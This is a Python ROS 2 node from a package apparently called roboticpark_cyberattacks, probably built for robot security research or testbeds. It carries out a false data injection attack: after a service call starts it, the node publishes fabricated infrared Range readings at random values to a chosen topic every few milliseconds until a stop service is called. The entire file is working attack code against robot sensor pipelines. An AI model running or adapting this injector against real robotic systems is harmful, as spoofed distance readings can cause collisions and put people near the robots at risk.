import rclpy, sys, os
from rclpy.node import Node, NodeNameNonExistentError
from roboticpark_cyberattacks.utils import rslg, printargs, import_message_type
from rcl_interfaces.srv import *
from std_srvs.srv import Trigger
from multiprocessing import Pool
from sensor_msgs.msg import Range
import random, time
import threading

class fdianode(Node):

    topic=""
    rangeStart=0.0
    rangeEnd=0.0
    publisher = None
    frameid = None
    continueAttack = False

    def __init__(self):
        super().__init__("fdianode")
        self.declare_parameter('fdia_topic', "Unset")
        self.declare_parameter('fdia_frame_id', "Unset")
        self.declare_parameter('fdia_range_start',0.0)
        self.declare_parameter('fdia_range_end', 0.0)
        printargs(self)
        self.topic= self.get_parameter('fdia_topic').get_parameter_value().string_value
        self.frameid= self.get_parameter('fdia_frame_id').get_parameter_value().string_value
        self.rangeStart= self.get_parameter('fdia_range_start').get_parameter_value().double_value
        self.rangeEnd= self.get_parameter('fdia_range_end').get_parameter_value().double_value
        rslg(self,f'{self.rangeStart} {self.rangeEnd}')
 
        if self.topic == 'Unset' or self.rangeStart == 0 or self.rangeEnd == 0 or self.frameid == "Unset":
            rslg(self,f'No topic has been specified or invalid range')
            sys.exit()
            
        # Create random injection services, triggers
        serviceName = f'{self.get_name()}/startfdiainject'
        self.srv = self.create_service(Trigger, serviceName, self.fdiainjectbridge)

        serviceName = f'{self.get_name()}/stopfdiainject'
        self.srv = self.create_service(Trigger, serviceName, self.stopfdiainject)

        

    def fdiainjectbridge(self, request, response):
        response.message = f"Successfully launching random attack"

        threading.Thread(target=self.fdiainject).start()

        response.success = True
        response.message = response.message
        return response



    def fdiainject(self):
        """This function  injects messagges into one topic, decided by the user who invokes the node
        However, this function is no portable. It will send always the same type of message: sensor_msgs/msg/Range

        DataExample:
            The following is an example of the message data sent by this function:

            .. code-block:: yaml

                ---
                header:
                stamp:
                    sec: 0
                    nanosec: 0
                frame_id: range_left
                radiation_type: 1
                field_of_view: 1.5707999467849731
                min_range: 0.0
                max_range: 2.0
                range: 1.470906376838684
                ---

        Returns:
            None

        """
        rslg(self,f'Launching random false data into measures')

        self.continueAttack = True
        self.publisher = self.create_publisher(Range,self.topic,10)

        while self.continueAttack:
            time.sleep(0.003)
            msg = Range() 
            msg.header.frame_id = self.frameid
            
            msg.radiation_type = Range.INFRARED   
            msg.field_of_view = 1.57  
            msg.min_range = 0.0  
            msg.max_range = 2.0  
            msg.range = random.uniform(self.rangeStart, self.rangeEnd)
            rslg(self,f'{msg.range}')

            self.publisher.publish(msg)


    def stopfdiainject(self, request,response):
        """This function  marks the stop to the attack with a boolean value establishment

        Parameters:
            request: Dict, the request
            response:  Dict, the response

        """
        response.message = f"Stopped"
        rslg(self,f'Stopping the fdia attack  ')

        self.continueAttack = False

        response.success = True
        response.message = response.message
        return response




def main():
    rclpy.init()
    myfdianode = fdianode()

    rclpy.spin(myfdianode)

    rclpy.shutdown()
    